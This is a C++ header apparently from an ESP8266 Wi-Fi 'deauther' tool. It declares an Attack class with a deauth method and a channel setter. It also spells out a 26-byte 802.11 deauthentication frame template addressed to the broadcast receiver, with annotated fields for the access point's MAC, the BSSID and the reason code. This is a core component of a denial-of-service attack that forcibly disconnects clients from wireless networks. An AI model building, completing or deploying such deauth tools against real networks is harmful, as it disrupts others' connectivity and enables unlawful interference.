#pragma once

#include <ESP8266WiFi.h>

#include <cstring>
#include <stdint.h>


class Attack {
  public:
    Attack();
    bool deauth(int apNum);
    void setWifiChannel(uint8_t channel);

  private:
    uint8_t baseDeauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
      /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };
    uint8_t currentChannel;
};
